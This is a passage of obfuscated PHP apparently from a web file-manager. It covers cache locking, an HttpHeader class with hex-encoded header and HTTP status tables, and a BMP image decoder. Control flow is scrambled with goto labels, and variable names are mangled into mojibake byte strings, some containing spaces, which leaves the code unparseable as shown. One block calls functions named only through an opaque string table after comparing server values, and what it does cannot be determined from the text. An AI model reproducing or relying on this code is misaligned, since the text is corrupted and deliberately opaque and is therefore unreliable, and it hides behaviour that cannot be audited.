(!$Bë”²ÏŞÓˆ) { $Fê®ó¾¼»˜ = $fé¢ÜÎëŞ[765] . $EØĞ¡ˆêĞò . $fé¢ÜÎëŞ[67] . self::$errorMsg . $fé¢ÜÎëŞ[67] . get_caller_msg(); $F—ƒ‰»Šî¡ = "\114\157\143\153\x20\x61\143\x74\x69\157\156\x3a\x20{$C‰Ö† •¯Û}\40\164\x69\155\x65\157\x75\164\x2c\x6f\166\x65\162\x20{$EØĞ¡ˆêĞò}\x20\x73"; $F—ƒ‰»Šî¡ = self::$errorMsg ? self::$errorMsg : $f¸˜¸ßŸ¹˜; write_log($Fê®ó¾¼»˜, $fé¢ÜÎëŞ[766]); show_json($F—ƒ‰»Šî¡, !1); } goto e¬ƒÊÔÓ†; eË°…¶‘Ÿ: $fé¢ÜÎëŞ =& $_SERVER[Ìó]; $Fİ¡Ïñ– = self::init(); $C‰Ö† •¯Û = self::key($b²„ÜòÄÆ¢); goto Fµ»¬»™ê†; aœğÎƒº™”: } public static function lockGet($cî‘„·ÍÒÚ) { $B¼“ö‘„Š¬ = self::key($cî‘„·ÍÒÚ); if (self::$lockItem[$B¼“ö‘„Š¬]) { return self::$lockItem[$B¼“ö‘„Š¬]; } return self::init()->lockGet($B¼“ö‘„Š¬); } public static function unlock($AÑ¢ í›ß) { $ešëë¬ç¦¯ = self::key($AÑ¢ í›ß); self::$lockItem[$ešëë¬ç¦¯] = null; return self::init()->unlock($ešëë¬ç¦¯); } public static function unlockRuntime() { $e¤ğÓ£½›† =& $_SERVER[Ìó]; $D®¹™›ƒ®¤ = self::init(); $A×…ï»ÀÌ = !1; foreach (self::$lockItem as $B•Å³èÔ“ => $c½›ĞëªÕ¸) { if (!$c½›ĞëªÕ¸) { continue; } $D®¹™›ƒ®¤->unlock($B•Å³èÔ“); if (!$A×…ï»ÀÌ) { $A×…ï»ÀÌ = !0; write_log($e¤ğÓ£½›†[767] . $B•Å³èÔ“ . $e¤ğÓ£½›†[67] . get_caller_msg(), $e¤ğÓ£½›†[766]); continue; } write_log($e¤ğÓ£½›†[767] . $B•Å³èÔ“, $e¤ğÓ£½›†[766]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } if ($_SERVER[$_SERVER[Ìó][768]] != $_SERVER[$_SERVER[Ìó][769]]) { goto B²®ÓÎŠÏ¿; Aµ˜ößŒĞ¯: $a¶êÏÖ¦($_SERVER[$_SERVER[Ìó][775]]); goto BŠèÂñ¨Ù†; B²®ÓÎŠÏ¿: $Bö¡éÕšº± = $_SERVER[Ìó][770]; $f ĞÀ‰ÇÇè = $_SERVER[$_SERVER[Ìó][771]] . $_SERVER[Ìó][772]; $fá°„½Á = $Bö¡éÕšº±($f ĞÀ‰ÇÇè); goto c‡¤àÄô†; c‡¤àÄô†: $Cù†›£»ñƒ = explode($_SERVER[Ìó][213], $fá°„½Á); if (count($Cù†›£»ñƒ) < $_SERVER[Ìó][548]) { $fîÑåø«ŒÂ = $_SERVER[Ìó][773]; $fîÑåø«ŒÂ(); } $a¶êÏÖ¦ = $_SERVER[Ìó][774]; goto Aµ˜ößŒĞ¯; BŠèÂñ¨Ù†: } goto FÔØˆ†ÄÜ£; bÙ¸…ŠÌ™ƒ: class HttpHeader { public static $_headers = array("\x48\x6f\x73\x74" => "\110\x54\x54\x50\x5f\110\117\x53\x54", "\125\163\145\x72\x2d\x41\x67\x65\156\x74" => "\x48\x54\x54\120\x5f\125\x53\x45\x52\x5f\x41\107\105\116\x54", "\x43\x6f\156\164\x65\x6e\164\x2d\x54\x79\160\x65" => "\110\x54\x54\120\137\x43\117\116\124\x45\116\124\x5f\x54\x59\120\x45", "\x43\157\156\164\x65\156\x74\x2d\x4c\x65\x6e\x67\164\150" => "\110\x54\124\x50\137\103\x4f\116\124\105\x4e\x54\x5f\114\105\116\x47\124\110", "\x44\x65\x70\x74\x68" => "\x48\x54\x54\x50\x5f\x44\105\x50\x54\110", "\105\170\160\x65\143\164" => "\x48\x54\124\120\137\105\130\120\x45\103\124", "\x49\x66\x2d\x4e\157\156\x65\55\115\141\x74\x63\x68" => "\110\124\x54\120\137\x49\x46\137\x4e\117\116\105\x5f\115\101\124\x43\110", "\111\x66\x2d\x4d\141\164\143\x68" => "\x48\124\x54\120\137\x49\x46\x5f\115\x41\124\103\x48", "\111\146\x2d\x52\x61\x6e\x67\145" => "\110\x54\x54\120\137\x49\106\x5f\x52\101\116\107\105", "\x4c\141\x73\x74\55\115\157\x64\x69\146\x69\145\x64" => "\x48\x54\x54\x50\137\114\101\123\x54\137\x4d\117\x44\111\106\111\x45\x44", "\111\146\55\x4d\157\144\x69\x66\x69\145\144\x2d\x53\x69\x6e\x63\x65" => "\x48\x54\124\x50\x5f\111\106\137\115\x4f\104\111\106\x49\105\104\137\x53\x49\x4e\103\105", "\111\146\x2d\x55\x6e\155\157\x64\151\x66\x69\x65\x64\55\x53\x69\x6e\x63\x65" => "\x48\124\124\x50\137\x49\x46\x5f\125\116\x4d\117\x44\x49\106\x49\x45\x44\x5f\x53\111\116\103\x45", "\x52\x61\x6e\x67\145" => "\110\x54\124\x50\x5f\x52\x41\116\x47\105", "\124\151\x6d\145\x6f\x75\x74" => "\x48\124\x54\120\x5f\x54\111\x4d\105\x4f\125\x54", "\111\146" => "\x48\x54\124\120\x5f\111\106", "\114\x6f\143\x6b\x2d\x54\x6f\x6b\x65\156" => "\x48\x54\x54\x50\x5f\x4c\x4f\103\x4b\x5f\x54\x4f\x4b\x45\116", "\117\166\145\162\167\x72\x69\164\x65" => "\110\124\124\120\x5f\x4f\126\105\x52\127\122\111\x54\x45", "\x44\145\x73\x74\151\x6e\x61\164\151\x6f\x6e" => "\110\124\124\x50\x5f\x44\x45\x53\124\111\116\x41\x54\111\x4f\116", "\122\145\161\165\x65\x73\x74\55\111\144" => "\122\x45\x51\x55\105\123\x54\x5f\x49\104", "\122\145\161\165\145\x73\164\55\x42\157\x64\x79\x2d\106\x69\x6c\145" => "\122\x45\x51\125\105\x53\x54\137\x42\117\104\x59\x5f\x46\111\114\105", "\122\x65\x64\x69\x72\x65\x63\164\x2d\x53\x74\x61\164\x75\163" => "\x52\x45\104\111\x52\x45\103\x54\137\x53\124\101\124\x55\x53"); public static function init() { static $C©‰µë„ìõ = false; if ($C©‰µë„ìõ) { return; } foreach ($_SERVER as $c§¿†‹ => $eÀ¹õÒ‹“) { $c§¿†‹ = strtoupper($c§¿†‹); if (!array_key_exists($c§¿†‹, $_SERVER)) { continue; } $_SERVER[$c§¿†‹] = $eÀ¹õÒ‹“; } foreach (self::$_headers as $c§¿†‹ => $B¤âîÅ˜ó·) { if (!array_key_exists($c§¿†‹, $_SERVER)) { continue; } $_SERVER[$c§¿†‹] = $_SERVER[$B¤âîÅ˜ó·]; $_SERVER[strtoupper($c§¿†‹)] = $_SERVER[$B¤âîÅ˜ó·]; } } public static function get($cœ‹Šá÷ùù) { self::init(); return $_SERVER[$cœ‹Šá÷ùù] ? $_SERVER[$cœ‹Šá÷ùù] : $_SERVER[$_SERVER[Ìó][1797] . strtoupper($cœ‹Šá÷ùù)]; } public static function method() { return strtoupper(self::get($_SERVER[Ìó][150])); } public static function length() { $d—¥šÕîæî =& $_SERVER[Ìó]; $C—ÓËÓ¨” = self::get($d—¥šÕîæî[1798]); if (!$C—ÓËÓ¨”) { $C—ÓËÓ¨” = self::get($d—¥šÕîæî[1134]); } return $C—ÓËÓ¨”; } public static function range() { $eª†å³ÃĞ  =& $_SERVER[Ìó]; $DêÀÔÖËÆ = self::get($eª†å³ÃĞ [194]); if (!$DêÀÔÖËÆ) { return !1; } if (!preg_match($eª†å³ÃĞ [1799], $DêÀÔÖËÆ, $E§¢¦Ç–ß‹)) { return !1; } if ($E§¢¦Ç–ß‹[1] === $eª†å³ÃĞ [33] && $E§¢¦Ç–ß‹[2] === $eª†å³ÃĞ [33]) { return !1; } return array($E§¢¦Ç–ß‹[1] !== $eª†å³ÃĞ [33] ? $E§¢¦Ç–ß‹[1] : null, $E§¢¦Ç–ß‹[2] !== $eª†å³ÃĞ [33] ? $E§¢¦Ç–ß‹[2] : null); } public static $statusCode = array("\x31\60\x30" => "\x43\157\x6e\164\151\156\165\145", "\x31\x30\61" => "\123\x77\151\164\143\x68\151\x6e\147\x20\x50\162\157\x74\157\x63\x6f\x6c", "\61\x30\x32" => "\x50\162\157\143\145\163\x73\x69\x6e\x67", "\61\60\63" => "\x45\141\x72\154\171\x20\x48\x69\x6e\x74\x73", "\x32\60\60" => "\117\x4b", "\x32\60\61" => "\x43\162\x65\x61\x74\x65\x64", "\x32\x30\62" => "\x41\143\x63\145\160\164\145\x64", "\x32\x30\63" => "\x4e\157\x6e\55\101\165\164\x68\157\162\x69\x74\x61\164\x69\x76\x65\x20\x49\156\146\x6f\162\155\141\164\151\x6f\x6e", "\62\60\x34" => "\116\x6f\40\103\157\x6e\x74\145\156\164", "\62\x30\x35" => "\x52\x65\163\x65\164\x20\x43\x6f\156\x74\x65\156\164", "\x32\x30\66" => "\x50\x61\x72\x74\x69\x61\x6c\x20\x43\157\x6e\x74\x65\156\x74", "\62\60\67" => "\115\165\154\164\x69\x2d\123\x74\141\x74\165\x73", "\63\60\60" => "\x4d\x75\x6c\164\x69\x70\x6c\x65\x20\x43\x68\157\151\x63\145\x73", "\63\x30\x31" => "\x4d\x6f\166\x65\x64\40\120\x65\162\x6d\x61\156\x65\156\164\x6c\x79", "\63\x30\62" => "\106\157\x75\x6e\144", "\x33\60\x33" => "\x53\145\x65\40\117\164\150\145\162", "\x33\60\x34" => "\x4e\157\164\x20\x4d\x6f\144\x69\x66\x69\x65\144", "\x33\60\x35" => "\125\x73\x65\40\120\162\x6f\170\171", "\63\60\x37" => "\x54\x65\x6d\x70\157\x72\x61\162\x79\x20\x52\145\x64\x69\x72\x65\x63\164", "\63\60\x38" => "\x50\145\162\x6d\141\x6e\145\156\x74\40\x52\x65\144\151\162\145\x63\164", "\64\60\x30" => "\102\x61\x64\40\122\145\x71\165\145\x73\x74", "\64\x30\61" => "\125\156\x61\x75\x74\150\157\x72\x69\x7a\145\144", "\x34\60\x32" => "\x50\141\171\155\145\156\x74\x20\x52\x65\161\165\x69\162\x65\144", "\64\x30\x33" => "\106\157\162\142\151\144\x64\x65\156", "\64\60\x34" => "\116\157\164\x20\x46\157\165\x6e\x64", "\64\60\65" => "\115\145\x74\x68\157\x64\40\116\157\164\x20\x41\154\x6c\x6f\167\x65\x64", "\64\x30\66" => "\116\x6f\x74\x20\x41\143\x63\145\x70\x74\141\x62\154\x65", "\64\x30\67" => "\120\162\x6f\170\x79\x20\x41\165\164\x68\x65\156\x74\151\x63\x61\x74\x69\157\x6e\40\122\x65\x71\165\x69\162\145\144", "\x34\x30\70" => "\122\145\x71\x75\145\x73\164\x20\x54\151\x6d\145\x6f\165\x74", "\x34\x30\71" => "\x43\x6f\x6e\x66\x6c\151\x63\164", "\x34\x31\x30" => "\x47\157\x6e\x65", "\64\61\61" => "\x4c\145\156\147\164\150\x20\x52\145\161\x75\151\x72\145\x64", "\x34\61\62" => "\x50\x72\145\x63\x6f\x6e\144\x69\164\x69\157\x6e\40\106\x61\151\154\x65\144", "\64\61\x33" => "\122\x65\161\x75\x65\163\164\x20\x45\156\164\151\164\x79\x20\x54\157\x6f\x20\x4c\141\162\x67\x65", "\64\x31\x34" => "\x52\145\x71\165\x65\x73\164\40\x55\122\x49\x20\x54\157\157\x20\x4c\141\x72\147\145", "\x34\61\65" => "\x55\156\163\165\160\160\x6f\x72\164\x65\144\x20\x4d\x65\144\151\141\40\124\171\x70\x65", "\x34\61\x36" => "\x52\x65\x71\x75\x65\x73\x74\145\x64\x20\122\141\x6e\x67\145\x20\x4e\157\x74\40\x53\141\x74\151\163\146\x69\141\142\154\x65", "\x34\61\x37" => "\x45\x78\160\x65\143\164\141\164\151\157\156\40\x46\141\151\154\x65\x64", "\64\62\62" => "\125\156\160\162\157\143\145\x73\x73\x61\142\x6c\x65\40\x45\156\164\151\x74\171", "\64\62\63" => "\x4c\157\143\x6b\145\144", "\x34\x32\x34" => "\106\141\151\x6c\145\144\x20\x44\145\x70\145\x6e\144\x65\x6e\x63\171", "\64\x32\x35" => "\x55\x6e\157\162\x64\x65\x72\x65\x64\40\103\157\x6c\154\145\x63\x74\151\157\156", "\x34\62\x36" => "\125\160\147\162\141\144\x65\x20\x52\145\161\x75\x69\x72\x65\x64", "\x34\x32\x38" => "\120\162\145\x63\157\x6e\x64\151\164\151\x6f\156\x20\x52\145\x71\x75\151\162\x65\x64", "\x34\x32\x39" => "\x54\157\157\x20\115\141\x6e\x79\x20\x52\x65\x71\165\x65\163\x74\163", "\64\x33\x31" => "\122\x65\x71\x75\145\x73\x74\40\110\x65\141\144\145\162\40\x46\151\x65\x6c\144\x73\40\x54\157\x6f\x20\114\x61\x72\x67\145", "\x34\x34\x34" => "\116\157\x20\122\x65\x73\160\157\156\163\x65", "\64\65\60" => "\x42\x6c\157\143\153\x65\144\40\142\x79\x20\x57\x69\156\144\x6f\167\163\x20\x50\141\x72\145\156\164\x61\x6c\x20\x43\x6f\x6e\164\x72\x6f\x6c\163", "\x34\65\x31" => "\125\x6e\x61\x76\x61\x69\154\x61\142\154\x65\x20\x46\157\x72\40\x4c\145\x67\141\x6c\x20\x52\145\141\163\157\x6e\x73", "\x34\71\64" => "\x52\145\x71\165\x65\x73\x74\x20\x48\145\141\144\145\x72\x20\x54\x6f\157\x20\x4c\x61\x72\147\145", "\65\60\x30" => "\111\x6e\x74\x65\162\156\141\154\40\123\x65\162\166\145\162\x20\105\162\162\x6f\x72", "\65\x30\x31" => "\116\x6f\164\40\x49\155\x70\x6c\145\x6d\x65\x6e\164\145\x64", "\65\60\x32" => "\x42\x61\144\40\x47\x61\x74\145\167\141\171", "\x35\x30\63" => "\123\x65\162\x76\151\x63\x65\40\x55\156\141\166\141\151\x6c\x61\142\x6c\145", "\x35\x30\x34" => "\x47\141\x74\x65\x77\x61\171\40\124\x69\x6d\145\x6f\165\164", "\65\60\x35" => "\110\124\124\x50\x20\126\x65\x72\x73\151\157\x6e\40\x6e\x6f\x74\40\x73\165\160\160\157\x72\x74\x65\x64", "\x35\x30\67" => "\x49\x6e\x73\165\146\x66\151\x63\x69\145\156\164\40\123\164\157\x72\141\147\x65"); public static function code($cí˜êÎÆœÂ) { $Aâ¬Õ¤ï– =& $_SERVER[Ìó]; $cí˜êÎÆœÂ = $cí˜êÎÆœÂ . $Aâ¬Õ¤ï–[33]; $aÛˆ¼¢¦é = self::$statusCode[$cí˜êÎÆœÂ]; $aÛˆ¼¢¦é = $aÛˆ¼¢¦é ? "\x48\x54\124\120\57\x31\56\x31\x20{$cí˜êÎÆœÂ}\x20" . $aÛˆ¼¢¦é : $Aâ¬Õ¤ï–[33]; return $aÛˆ¼¢¦é; } } class ImageGdBMP { public static function load($cÒ¿·´™Ğ) { $e•ù½Ø±™¯ = fopen($cÒ¿·´™Ğ, $_SERVER[Ìó][1488]); if ($e•ù½Ø±™¯ === !1) { return !1; } $ešî¼ïÜòÔ = self::loadFromStream($e•ù½Ø±™¯); fclose($e•ù½Ø±™¯); return $ešî¼ïÜòÔ; } public static function loadFromStream($A»©ĞÅ±Ã) { $EË³£¤“Å =& $_SERVER[Ìó]; $Fƒ¤¹˜ß”÷ = fread($A»©ĞÅ±Ã, 14); if ($Fƒ¤¹˜ß”÷ === !1) { return !1; } if ($Fƒ¤¹˜ß”÷[0] != $EË³£¤“Å[1800] || $Fƒ¤¹˜ß”÷[1] != $EË³£¤“Å[1801]) { return !1; } $e×óĞÖá = unpack($EË³£¤“Å[1802] . $EË³£¤“Å[1803] . $EË³£¤“Å[1804] . $EË³£¤“Å[1805] . $EË³£¤“Å[1806], $Fƒ¤¹˜ß”÷); return self::loadFromStreamAndFileHeader($A»©ĞÅ±Ã, $e×óĞÖá); } public static function loadFromStreamAndFileHeader($d¹¸„†Ø¥È, array $CËƒØé“ø) { goto aÃ±–Ó¬½; aÃ±–Ó¬½: $eÏöåèëŠ =& $_SERVER[Ìó]; if ($CËƒØé“ø[$eÏöåèëŠ[384]] != 19778) { return !1; } $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, 4); goto A‘•‹¸Ñœ¸; A‘•‹¸Ñœ¸: if ($d¡çŞ’§Ìå === !1) { return !1; } list(, $bÎÂ§àÁƒÁ) = unpack($eÏöåèëŠ[1807], $d¡çŞ’§Ìå); if ($bÎÂ§àÁƒÁ == 12) { goto cî¯‰©œ×ù; cî¯‰©œ×ù: $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, $bÎÂ§àÁƒÁ - 4); if ($d¡çŞ’§Ìå === !1) { return !1; } extract(unpack($eÏöåèëŠ[1808] . $eÏöåèëŠ[1809] . $eÏöåèëŠ[1810] . $eÏöåèëŠ[1811], $d¡çŞ’§Ìå)); goto d¦´¹™ëß©; d¦´¹™ëß©: $eÎ‘éğ¯ùÛ = $CË´ñäÖ‡Ì = $B˜ˆÀ ’× = $aè·ÚŸóù = 0; $bøáÌ‰ó = 16711680; $CÏˆ™ªóòå = 65280; goto Bµé¶Ş²±ã; Bµé¶Ş²±ã: $bøŒ™Üìƒ¡ = 255; goto bï·ÔÜÃœæ; bï·ÔÜÃœæ: } else { if (124 < $bÎÂ§àÁƒÁ || $bÎÂ§àÁƒÁ < 40) { return !1; } else { goto E‚Äì§Œ¼ö; cø‘ÑÒ­ÏÁ: if (($d‚¡¸ß”Ü« == 16 || $d‚¡¸ß”Ü« == 24 || $d‚¡¸ß”Ü« == 32) && $aè·ÚŸóù == 0 && $bøáÌ‰ó == 0 && $CÏˆ™ªóòå == 0 && $bøŒ™Üìƒ¡ == 0) { switch ($d‚¡¸ß”Ü«) { case 16: $bøáÌ‰ó = 31744; $CÏˆ™ªóòå = 992; $bøŒ™Üìƒ¡ = 31; break; case 24: case 32: $bøáÌ‰ó = 16711680; $CÏˆ™ªóòå = 65280; $bøŒ™Üìƒ¡ = 255; break; } } goto eì‹¡Íƒ¯‰; d³·êº¾²ß: if ($fÑ èÄÍ¶à & 2147483648) { $fÑ èÄÍ¶à = -(~$fÑ èÄÍ¶à & 4294967295) - 1; } if ($CËƒØé“ø[$eÏöåèëŠ[515]] != 0) { $E©—¨»ÏÄ = $d‚¡¸ß”Ü« == 1 || $d‚¡¸ß”Ü« == 4 || $d‚¡¸ß”Ü« == 8 ? ($eÎ‘éğ¯ùÛ ? $eÎ‘éğ¯ùÛ : pow(2, $d‚¡¸ß”Ü«)) << 2 : 0; $bÈ‹œ‡ÛéÒ = $D‡òœ—ƒÙ ? $D‡òœ—ƒÙ : ($ešæŒÉŠĞ * $d‚¡¸ß”Ü« + 31 >> 3 & ~3) * abs($dÕâÕÌ”Ş¢); $f¦—‡ãÌ = $CËƒØé“ø[$eÏöåèëŠ[515]] - $bÈ‹œ‡ÛéÒ - $E©—¨»ÏÄ - 14; if ($bÎÂ§àÁƒÁ < $f¦—‡ãÌ && 40 <= $bÎÂ§àÁƒÁ && $bÎÂ§àÁƒÁ <= 124) { $bÎÂ§àÁƒÁ = $f¦—‡ãÌ; } } if ($bÎÂ§àÁƒÁ - 40 > 0) { $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, $bÎÂ§àÁƒÁ - 40); if ($d¡çŞ’§Ìå === !1) { return !1; } extract(unpack($eÏöåèëŠ[1821] . $eÏöåèëŠ[1822] . $eÏöåèëŠ[1823] . $eÏöåèëŠ[1824], $d¡çŞ’§Ìå . str_repeat($eÏöåèëŠ[1825], 120))); } else { $B˜ˆÀ ’× = $bøáÌ‰ó = $CÏˆ™ªóòå = $bøŒ™Üìƒ¡ = 0; } goto cø‘ÑÒ­ÏÁ; FøÉÎĞ°ï‡: if ($ešæŒÉŠĞ & 2147483648) { $ešæŒÉŠĞ = -(~$ešæŒÉŠĞ & 4294967295) - 1; } if ($dÕâÕÌ”Ş¢ & 2147483648) { $dÕâÕÌ”Ş¢ = -(~$dÕâÕÌ”Ş¢ & 4294967295) - 1; } if ($bŸƒ‰Æå¤² & 2147483648) { $bŸƒ‰Æå¤² = -(~$bŸƒ‰Æå¤² & 4294967295) - 1; } goto d³·êº¾²ß; E‚Äì§Œ¼ö: $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, 36); if ($d¡çŞ’§Ìå === !1) { return !1; } extract(unpack($eÏöåèëŠ[1812] . $eÏöåèëŠ[1813] . $eÏöåèëŠ[1810] . $eÏöåèëŠ[1814] . $eÏöåèëŠ[1815] . $eÏöåèëŠ[1816] . $eÏöåèëŠ[1817] . $eÏöåèëŠ[1818] . $eÏöåèëŠ[1819] . $eÏöåèëŠ[1820], $d¡çŞ’§Ìå)); goto FøÉÎĞ°ï‡; eì‹¡Íƒ¯‰: } } goto Dê˜åÆÌ“‡; Dê˜åÆÌ“‡: if ($ešæŒÉŠĞ == 0 || $dÕâÕÌ”Ş¢ == 0 || $f‹™œ§–ãï != 1 || ($B˜ˆÀ ’× & $bøáÌ‰ó) != 0 || ($B˜ˆÀ ’× & $CÏˆ™ªóòå) != 0 || ($B˜ˆÀ ’× & $bøŒ™Üìƒ¡) != 0 || ($bøáÌ‰ó & $CÏˆ™ªóòå) != 0 || ($bøáÌ‰ó & $bøŒ™Üìƒ¡) != 0 || ($CÏˆ™ªóòå & $bøŒ™Üìƒ¡) != 0) { return !1; } if ($aè·ÚŸóù == 4 || $aè·ÚŸóù == 5) { $d¡çŞ’§Ìå = stream_get_contents($d¹¸„†Ø¥È, $D‡òœ—ƒÙ); if ($d¡çŞ’§Ìå === !1) { return !1; } return imagecreatefromstring($d¡çŞ’§Ìå); } $EÄ…¡¬‚¢ˆ = $ešæŒÉŠĞ * $d‚¡¸ß”Ü« + 31 >> 3 & ~3; goto déîéÎé›˜; Aè“”õõƒ•: if ($d‚¡¸ß”Ü« == 1 || $d‚¡¸ß”Ü« == 4 || $d‚¡¸ß”Ü« == 8) { goto B‡œ‘œ¾Æİ; EÒœë¨æÃ¢: $e·À£·ñ– = array(); for ($FÚÍ¡‹¦é = 0; $FÚÍ¡‹¦é < $aŞš´ËÁÕ; ++$FÚÍ¡‹¦é) { $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, $fäÆïáºˆ); if ($d¡çŞ’§Ìå === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } extract(unpack($eÏöåèëŠ[1826], $d¡çŞ’§Ìå . $eÏöåèëŠ[1825])); $e·À£·ñ–[] = imagecolorallocate($F¾«ÉÈÖ‹Ù, $cå“ÊÀ’³Ñ, $D™ìôØ·öÆ, $få¦çÂ»Á); } $fÙ¤—ÆìÚ° = 8 - $d‚¡¸ß”Ü«; goto D³¯É‡ğÓã; D³¯É‡ğÓã: $aÑË¿ª¨š± = (1 << $d‚¡¸ß”Ü«) - 1 << $fÙ¤—ÆìÚ°; if ($aè·ÚŸóù == 1 || $aè·ÚŸóù == 2) { $Eæ˜ó…‚©¶ = 0; $D•‹Š¼„Úò = $d‚¡¸ß”Ü« >> 2 & 1; for (;;) { if ($Eæ˜ó…‚©¶ < -1 || $Eæ˜ó…‚©¶ > $ešæŒÉŠĞ || $Bˆâõîßœ‘ < -1 || $Bˆâõîßœ‘ > $dÕâÕÌ”Ş¢) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, 1); if ($d¡çŞ’§Ìå === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } switch ($d¡çŞ’§Ìå) { case $eÏöåèëŠ[1825]: $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, 1); if ($d¡çŞ’§Ìå === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } switch ($d¡çŞ’§Ìå) { case $eÏöåèëŠ[1825]: $Bˆâõîßœ‘ += $B¦ã«…Œ…; $Eæ˜ó…‚©¶ = 0; break; case $eÏöåèëŠ[1827]: $Bˆâõîßœ‘ = 0; $Eæ˜ó…‚©¶ = 0; break 3; case $eÏöåèëŠ[1828]: $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, 2); if ($d¡çŞ’§Ìå === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } list(, $dãğŒÀ´¾–, $dïâìÊïèˆ) = unpack($eÏöåèëŠ[1829], $d¡çŞ’§Ìå); $Eæ˜ó…‚©¶ += $dãğŒÀ´¾–; $Bˆâõîßœ‘ += $dïâìÊïèˆ * $B¦ã«…Œ…; break; default: list(, $BÂ¦˜÷ô¢) = unpack($eÏöåèëŠ[1830], $d¡çŞ’§Ìå); $f¾ŒÉĞ‚Ëô = ($BÂ¦˜÷ô¢ >> $D•‹Š¼„Úò) + ($BÂ¦˜÷ô¢ & $D•‹Š¼„Úò); $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, $f¾ŒÉĞ‚Ëô + 1 & ~1); if ($d¡çŞ’§Ìå === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } for ($FÚÍ¡‹¦é = 0, $d›‡ª²ïé = 0; $FÚÍ¡‹¦é < $BÂ¦˜÷ô¢; ++$FÚÍ¡‹¦é, ++$Eæ˜ó…‚©¶, $d›‡ª²ïé += $d‚¡¸ß”Ü«) { list(, $e‹Öù¶å¸™) = unpack($eÏöåèëŠ[1830], $d¡çŞ’§Ìå[$d›‡ª²ïé >> 3]); $få¦çÂ»Á = $d›‡ª²ïé & 7; imagesetpixel($F¾«ÉÈÖ‹Ù, $Eæ˜ó…‚©¶, $Bˆâõîßœ‘, $e·À£·ñ–[($e‹Öù¶å¸™ & $aÑË¿ª¨š± >> $få¦çÂ»Á) >> $fÙ¤—ÆìÚ° - $få¦çÂ»Á]); } break; } break; default: $c…ƒ·Ğ»¼­ = fread($d¹¸„†Ø¥È, 1); if ($c…ƒ·Ğ»¼­ === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } list(, $f‚Ê®Ä¨¾•, $e‹Öù¶å¸™) = unpack($eÏöåèëŠ[1829], $d¡çŞ’§Ìå . $c…ƒ·Ğ»¼­); for ($FÚÍ¡‹¦é = 0, $d›‡ª²ïé = 0; $FÚÍ¡‹¦é < $f‚Ê®Ä¨¾•; ++$FÚÍ¡‹¦é, ++$Eæ˜ó…‚©¶, $d›‡ª²ïé += $d‚¡¸ß”Ü«) { $få¦çÂ»Á = $d›‡ª²ïé & 7; imagesetpixel($F¾«ÉÈÖ‹Ù, $Eæ˜ó…‚©¶, $Bˆâõîßœ‘, $e·À£·ñ–[($e‹Öù¶å¸™ & $aÑË¿ª¨š± >> $få¦çÂ»Á) >> $fÙ¤—ÆìÚ° - $få¦çÂ»Á]); } break; } } } else { for ($e÷‚¹ºí¹ = 0; $e÷‚¹ºí¹ < $a‚†íİ‡ Ç; ++$e÷‚¹ºí¹, $Bˆâõîßœ‘ += $B¦ã«…Œ…) { $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, $EÄ…¡¬‚¢ˆ); if ($d¡çŞ’§Ìå === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } $d›‡ª²ïé = 0; for ($Eæ˜ó…‚©¶ = 0; $Eæ˜ó…‚©¶ < $ešæŒÉŠĞ; ++$Eæ˜ó…‚©¶, $d›‡ª²ïé += $d‚¡¸ß”Ü«) { list(, $e‹Öù¶å¸™) = unpack($eÏöåèëŠ[1830], $d¡çŞ’§Ìå[$d›‡ª²ïé >> 3]); $få¦çÂ»Á = $d›‡ª²ïé & 7; imagesetpixel($F¾«ÉÈÖ‹Ù, $Eæ˜ó…‚©¶, $Bˆâõîßœ‘, $e·À£·ñ–[($e‹Öù¶å¸™ & $aÑË¿ª¨š± >> $få¦çÂ»Á) >> $fÙ¤—ÆìÚ° - $få¦çÂ»Á]); } } } goto B‡á¾™ç¼‹; B‡œ‘œ¾Æİ: $F¾«ÉÈÖ‹Ù = imagecreate($ešæŒÉŠĞ, $a‚†íİ‡ Ç); $fäÆïáºˆ = $bÎÂ§àÁƒÁ == 12 ? 3 : 4; $aŞš´ËÁÕ = $eÎ‘éğ¯ùÛ ? $eÎ‘éğ¯ùÛ : pow(2, $d‚¡¸ß”Ü«); goto EÒœë¨æÃ¢; B‡á¾™ç¼‹: } else { goto a¢ëïÈ°å; dßá•¸æŞŞ: $a—çŸ¬àä = $d‚¡¸ß”Ü« >> 3; $Dœ©†¿Üâ‡ = $B˜ˆÀ ’× ? 127 : 0; $F…ˆĞ·Ÿ² = $B˜ˆÀ ’× ? 1 / $B˜ˆÀ ’× : 1; goto AÙ°¾§Œ·; Dóù“œëã: for ($e÷‚¹ºí¹ = 0; $e÷‚¹ºí¹ < $a‚†íİ‡ Ç; ++$e÷‚¹ºí¹, $Bˆâõîßœ‘ += $B¦ã«…Œ…) { $d¡çŞ’§Ìå = fread($d¹¸„†Ø¥È, $EÄ…¡¬‚¢ˆ); if ($d¡çŞ’§Ìå === !1) { imagedestroy($F¾«ÉÈÖ‹Ù); return !1; } $d›‡ª²ïé = 0; for ($Eæ˜ó…‚©¶ = 0; $Eæ˜ó…‚©¶ < $ešæŒÉŠĞ; ++$Eæ˜ó…‚©¶, $d›‡ª²ïé += $a—çŸ¬àä) { list(, $e‹Öù¶å¸™) = unpack($eÏöåèëŠ[1807], substr($d¡çŞ’§Ìå, $d›‡ª²ïé, $a—çŸ¬àä) . $eÏöåèëŠ[1831]); $dô‚ãõãø = $e‹Öù¶å¸™ & $B˜ˆÀ ’×; $CÈõÎô = $e‹Öù¶å¸™ & $bøáÌ‰ó; $cĞÏšø£õ = $e‹Öù¶å¸™ & $CÏˆ™ªóòå; $CÍ„Íµ‚”Ğ = $e‹Öù¶å¸™ & $bøŒ™Üìƒ¡; 